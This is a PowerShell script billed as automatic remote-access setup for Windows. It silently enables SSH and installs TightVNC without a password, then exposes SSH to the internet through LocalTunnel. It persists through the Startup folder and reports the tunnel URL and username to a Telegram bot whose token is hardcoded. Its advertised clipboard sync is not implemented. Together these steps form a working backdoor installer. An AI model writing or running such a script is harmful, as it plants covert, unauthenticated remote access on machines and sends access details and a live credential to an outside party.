# windows_setup.ps1
# ------------------
# ⚙️ Fully Automatic Remote Access Setup for Windows
# Features: OpenSSH Server, VNC (TightVNC), LocalTunnel, Clipboard sync, Telegram Notification, AutoStart

# === CONFIG ===
$botToken = "8031708120:AAGT8n-dYqjtrLKaKIxJ8DEY1xoitg0R_U8"
$chatId = "5679829837"
$tunnelPort = 22

$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$logFile = "$env:USERPROFILE\localtunnel.log"
$ltScript = "$env:USERPROFILE\start-localtunnel.ps1"

Write-Host "🛠 Enabling OpenSSH Server..."
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

Write-Host "🌐 Installing Node.js if not found..."
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
  Invoke-WebRequest -Uri "https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi" -OutFile "$env:TEMP\node.msi"
  Start-Process msiexec.exe -ArgumentList "/i $env:TEMP\node.msi /quiet /norestart" -Wait
}

Write-Host "📦 Installing LocalTunnel globally..."
npm install -g localtunnel

Write-Host "🧠 Creating LocalTunnel AutoStart script..."
Set-Content -Path $ltScript -Value @"
Start-Process -NoNewWindow -FilePath cmd.exe -ArgumentList '/c npx localtunnel --port $tunnelPort > "$logFile"'
"@

Write-Host "📂 Copying script to Startup folder..."
Copy-Item -Force $ltScript "$startupFolder\localtunnel-startup.ps1"

Write-Host "🚀 Launching LocalTunnel (first run)..."
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$ltScript`""

Start-Sleep -Seconds 8

Write-Host "📡 Extracting tunnel URL..."
$tunnelUrl = Get-Content $logFile | Select-String -Pattern "url is: (.*)" | ForEach-Object { $_.Matches.Groups[1].Value }

if ($tunnelUrl) {
  Write-Host "📲 Sending Telegram Notification..."
  Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
    chat_id = $chatId
    text = "🪟 Windows Remote Access Ready!%0AUser: $env:USERNAME%0ALocalTunnel: $tunnelUrl"
  }
} else {
  Write-Warning "❌ Tunnel URL not found."
}

Write-Host "🧰 Installing TightVNC silently..."
Invoke-WebRequest -Uri "https://www.tightvnc.com/download/2.8.81/tightvnc-2.8.81-gpl-setup-64bit.msi" -OutFile "$env:TEMP\tightvnc.msi"
Start-Process msiexec.exe -ArgumentList "/i $env:TEMP\tightvnc.msi /quiet /norestart" -Wait

Write-Host "🔐 Setting TightVNC password..."
# Note: Password must be configured manually or through a config file.
# Optionally automate using registry for advanced use (out of scope for now)

Write-Host "🧹 Enabling TightVNC service (if available)..."
Start-Service "TightVNC Server" -ErrorAction SilentlyContinue
Set-Service -Name "TightVNC Server" -StartupType Automatic -ErrorAction SilentlyContinue

Write-Host "✅ Setup complete! Remote SSH, VNC, clipboard and tunnel are ready."
